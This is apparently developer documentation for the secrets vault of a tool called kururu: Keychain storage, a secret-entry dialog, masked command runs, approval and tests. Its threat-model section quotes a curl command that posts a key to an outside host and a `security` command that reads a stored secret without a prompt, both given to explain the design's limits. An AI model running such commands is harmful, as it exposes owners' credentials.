# The vault: secrets kept, asked for and used without being read

The vault is two things. It is a **census**, Settings → Vault, which names
every key, env file and login kururu can see or lend and never shows a value
([nodes](nodes.md#the-vault-page)). And it is a **store** of its own: values
the owner pastes into a dialog instead of a chat, kept in the Mac's
Keychain, written where a program needs them, and used by commands that
never show them to the model. This file is about the store. The argument,
the threat model and the order it was built in are in
[`plans/vault-secrets.md`](plans/vault-secrets.md).

## What it does and does not protect

It stops **accidents**: a key pasted into a chat and kept in a transcript, a
key an agent printed and the model repeated, a key in a backup, a log or on
a screen. It does **not** contain an agent that means harm, and cannot:

- A command run with a secret can send it anywhere. Masking its output does
  nothing about `curl -d "$KEY" https://elsewhere`.
- An item made by `/usr/bin/security` trusts that tool, so **any process
  running as the owner can read it** with `security find-generic-password
  -s kururu-vault -a <name> -w`, with no prompt. The approval setting governs
  kururu's door, not the Keychain behind it.
- An env file the dialog writes is a plain `0600` file, readable by anything
  running as the owner.

The answer to a misbehaving agent is **narrow, short-lived keys** — staging
rather than production, scoped to one thing, rotated after the job — and
**approval** on the ones that would hurt. Encryption is not that answer, and
nothing here pretends it is.

## Items

An item is a name, a label, a use rule and a value.

- **The name** is lower-case words in up to four `/`-separated parts, project
  first: `pylink/bancard-staging-private`, `deck/sudo`
  (`validItemName`, `shared/vaultitems.ts`).
- **The value** is a generic password in the login Keychain: service
  `kururu-vault`, account the name (`server/src/keychain.ts`). It is written
  with `security -i` reading `add-generic-password … -X <hex>` on its stdin,
  so it is never on a command line; a short printable value is kept as
  itself, anything else as `kururu-b64:` and its base64 in pieces of 1800
  characters (`<name>`, `<name>#1`, …), because one line of `security -i`
  holds about 4 KB and `-w` prints anything unprintable as hex without
  saying so. Every write is read back and compared.
- **The metadata** — label, rule, the env files a value was last written to,
  who asked, when, the last use — is `~/.config/kururu/vault.json`, `0600`,
  never a value. It is on `NEVER_SHARED` (never lent) and off the backup.
- **On Linux** there is no Keychain: values are `0600` files under
  `~/.config/kururu/vault/` (`0700`). `KURURU_VAULT_STORE=file` forces that
  on a Mac, and `KURURU_VAULT_KEYCHAIN=<path>` points the store at another
  keychain file — both for an isolated instance, which must not write the
  owner's Keychain.

## The dialog

Kuru calls `ask_secret`; an agent runs `vault ask`. Either names a title, a
reason and up to eight fields, each with a label, an item name, optionally
an env file and variable, and optionally `use: "ask"`:

```sh
vault ask --title "Bancard staging keys for Pylink" --reason "PYL-14's local checkout reads them" \
  --field "Public key"  --name pylink/bancard-staging-public  --env ~/.config/pylink-local/env:BANCARD_PUBLIC_KEY \
  --field "Private key" --name pylink/bancard-staging-private --env ~/.config/pylink-local/env:BANCARD_PRIVATE_KEY
```

- **Checked before it opens** (`adoptAskRequest`, `envPath`): a bad name, a
  path outside home or in a refused folder is the caller's error, never a
  dialog the owner has to puzzle over.
- **Drawn on every page** of this server — the window and the phone — over
  everything (`web/src/components/VaultAsk.tsx`), sent as `vault-asks` on
  connect and on every change, never to another node's watcher, so a phone
  that wakes up later still finds it. The first Save or Cancel answers; the
  others close. The scrim does not close it, and it says when it closes by
  itself.
- **How long it stays up** is the caller's: fifteen minutes by default,
  `--timeout 3h` (`vault ask`) or `open_for_min` (`ask_secret`), at most six
  hours, a stay outside 1 minute–6 hours refused rather than clamped. Ask for
  hours when the owner is away, rather than reopening it in a loop.
- **It survives the server restarting** — `bun run dev` restarts on every
  save. Each open ask (its words and deadline; there is no value yet) and
  what became of the last fifty for a day are kept in
  `<state>/vault-asks.json` (`0600`) and taken up by the next server with
  the time they have left; one that ran out meanwhile ends as `timeout`.
  `POST /api/vault/ask` answers with the ask's id at once and the outcome
  later, as JSON lines; a `vault ask` cut off by a restart waits again on
  `POST /api/vault/wait` by that id, for up to ninety seconds of no server.
  At shutdown `Vault.shutdown()` writes the asks and stops reading the
  connections closing under it as callers hanging up. Only an ask's caller
  hanging up — Ctrl-C, its agent ended — cancels it.
- **The fields** are masked inputs with a Show per field, uncontrolled, read
  once on Save into the one message that carries vault values
  (`vault-answer`), with every autofill hint off. Under each: the Keychain
  item, the env file and variable, and "Ask me before each use".
- **On Save** each field with a value goes to the store, then to its env
  file, then into `vault.json` (`Vault.answer`, `server/src/vaultstore.ts`);
  an empty field is skipped; one that fails does not stop the next. The
  page shows the outcome per field before it closes.
- **The caller hears**, per field, `saved`, `skipped`, `cancelled` (the
  owner's Cancel, or the caller stopped waiting), `timeout` (it stayed up its
  whole time unanswered) or `failed`, each but a save with why — "nobody
  answered within 3 hours", "the owner pressed Cancel" — and never a value.
  `vault ask` exits 0 when every field was saved, 3 on a timeout, 1
  otherwise. `ask_secret` waits up to nine minutes; after that it returns
  the ask's id and `ask_secret ask=<id>` waits again, or says how it ended,
  up to a day later.
- **The phone works**: it reaches this Mac over the tailnet, so a value
  travels inside Tailscale's WireGuard tunnel behind the share token; a
  paste is the operating system's and needs no secure context. A phone on
  another node sees that node's asks only.

### An env file

`server/src/vaultfile.ts` and `shared/envfile.ts`:

- under the home folder, resolved, checked, realpath'd and checked again;
  never under `~/.ssh`, `~/.gnupg`, `~/Library` or kururu's own config and
  state; never through a symlink; its folder made `0700` if missing;
- refused unless every line is blank, a comment or `NAME=value` (with
  `export `, and a quoted value over several lines), so a path mistyped as
  `~/.zshrc` changes nothing;
- copied first to `~/.local/state/kururu/vault/env-backups/` (`0600`, the
  newest five per file), not beside it, where a `.gitignore` might miss it;
- every line that sets the variable replaced where it stands, keeping its
  `export `; a variable not there appended; nothing else changed;
- the value bare when it can be, single-quoted when it has no `'`, otherwise
  double-quoted with `\ " $` and `` ` `` escaped; a value with a line break
  is kept in the Keychain and refused for the file;
- written `0600` beside itself and renamed in.

## Using a secret: `vault run`

```sh
vault run --secret pylink/bancard-staging-private=BANCARD_PRIVATE_KEY -- bun run smoke
vault run --askpass deck/sudo -- sudo -A systemctl restart thing
```

`server/src/vaultrun.ts`, through `POST /api/vault/run` (loopback only).

- **The server runs the command**, not the CLI, so there is no endpoint that
  hands a caller a value. The CLI sends its argv, folder and environment;
  the server checks every item exists, asks for approval when an item says
  so, reads the values, adds them to that environment and starts the
  command in a process group of its own with stdin closed (`detached`,
  `stdio: ignore`). A CLI that hangs up — Ctrl-C, its agent ended — ends the
  group, `SIGTERM` then `SIGKILL` after three seconds. The command is argv,
  not a shell line: `sh -c '…'` when it needs one.
- **The output** comes back as JSON lines — stdout and stderr as base64 of
  the masked bytes, kururu's own words as `note`, then `exit` — and the CLI
  exits with the command's code: 2 for an item not kept, 77 for not allowed,
  127 for a command not found.
- **Masking** (`shared/mask.ts`) replaces each value, its base64 and its
  URL-encoding with `[vault:<name>]`, on bytes, across chunk boundaries,
  holding back only a tail that could still begin a value. Values shorter
  than four characters are not masked: they would mask every such letter.
  What it misses is anything the command transforms first.
- **`--askpass`** puts no value in the environment. `SUDO_ASKPASS` points at
  `~/.local/state/kururu/bin/vault-askpass`, and `KURURU_VAULT_TICKET` holds
  a ticket the askpass trades with `POST /api/vault/askpass` for the value,
  which it prints to sudo — three times at most, while the run lives. sudo
  on another machine runs its own askpass, so the Steam Deck's is not this
  (see the plan's "The Steam Deck, later").
- **Every run is a line** in `~/.local/share/kururu/vault-uses.jsonl`
  (`0600`, off the backup): when, who (an agent by its card's code or title
  with its id, Kuru, or "a shell"), the items, the command as written —
  masked too, in case a value was typed into it — the folder, `free`,
  `owner`, `lasting` or `denied`, the exit code and how long. Who is read
  off `KURURU_AGENT_ID` and believed only for an agent the server has; a
  process that sets another agent's id is believed, which matters as much
  as the threat model says the Keychain does.

## Approval

Each item is `free` or `ask` (`UseRule`). An item starts at `ask` when its
name or label says `sudo`, `prod`, `production` or `live` (`defaultUse`),
else `free`; a caller may ask for `ask` but never make an item free; the
owner decides with the switch in the dialog that saves it, and later in
Settings → Vault.

A `vault run` that names an `ask` item waits in `Vault.approve`
(`server/src/vaultstore.ts`): the same floating dialog opens on every page,
with who, which items, the command and the folder, and **Allow once**,
**Allow for 15 min** and **Deny**. The CLI says it is waiting. Unanswered in
five minutes, or its caller gone, it is denied and nothing runs (exit 77).
Allow for 15 minutes is per agent and per item, held in memory and gone with
a restart; a caller that is no agent kururu knows is not offered it, since
there is nothing to hold it to. The log says which: `owner`, `lasting` or
`denied`.

## Settings → Vault

Above the census, **Kept in the vault**: every item by label and name, where
its value lives, the env files it was written to, when it was saved and for
whom, its last use, its rule with a button to change it, and Remove (which
leaves an env file as it is). Then **Recent uses**, the last fifty lines of
the log, with Clear. On a phone the page is for looking, as the census is.

## `list_secrets` and `vault list`

Every item by name and label, its rule, the env files it was written to and
its last use. Never a value.

## The Mac's own keys

The keys kururu kept in `0600` JSON files in `~/.config/kururu` — OpenRouter's
management key (`openrouter.json`), the Telegram bot's token
(`telegram.json`), the cloud Firecrawl key (`firecrawl.json`), the web
providers' keys (`web-<id>.json`), the Claude tokens made for lending
(`claude-lend.json`), a lent Claude token (`claude-token.json`) — are kept in
the Keychain on a Mac, service `kururu-config`, account `<file>:<field>`
(`server/src/configkeys.ts`).

- **Behind `config.ts`.** `writeConfigFile` puts each key in the Keychain
  and writes `"kururu-keychain:<nonce>"` in its place; `readConfigFile` puts
  the key back. Every module, the lending's `readSource` and the Vault page's
  hints read what they always did, and the settings beside each key stay in
  the file. A key a file no longer has, or a file removed, takes its item
  with it.
- **Read once per write.** `readConfigFile` is synchronous, so `security` is
  a `spawnSync`, and each key is remembered by its marker's nonce, which
  every write changes: a poller costs one call per process.
- **Moved at start.** `attach` turns it on before any module reads a key and
  moves every key still in the clear, reading each file back and comparing;
  a file that does not read back the same is written back as it was. A
  refusal on a later write keeps that key in its file and says so by name.
- **Off** for tests and every CLI (the server turns it on), on Linux, for an
  isolated instance with `KURURU_VAULT_STORE=file`, and with
  `KURURU_KEYCHAIN_CONFIG=0`. `KURURU_VAULT_KEYCHAIN` points it at another
  keychain file, as it does the items.
- **Not moved:** `access.json`, read by the hooks and CLIs in other processes
  and on a child with no Keychain; `node.json` and `nodes.json`, because a
  locked Keychain at boot would be a node that cannot link.
- **Going back** to a kururu from before this: quit kururu, run `vault
  to-files` (it refuses while a server answers), and start the older one —
  or this one with `KURURU_KEYCHAIN_CONFIG=0`. An older kururu that reads a
  moved file sees a marker where the key was and acts as if none were set.
- **On a child** nothing changes: lent keys land as the files they always
  were, written with nothing to seal them.

## Tests

`server/test/vaultitems.test.ts` drives an ask from open to answer with a
store in memory and a scratch home, and greps everything that left the vault
— what pages were sent, the log, `vault.json`, the caller's answer — for the
values. `server/test/keychain.test.ts` makes a throwaway keychain in a
scratch folder and deletes it after, and never touches the login keychain;
`server/test/configkeys.test.ts` does the same for the config keys, with a
scratch config folder, and puts the sealer and the environment back after.
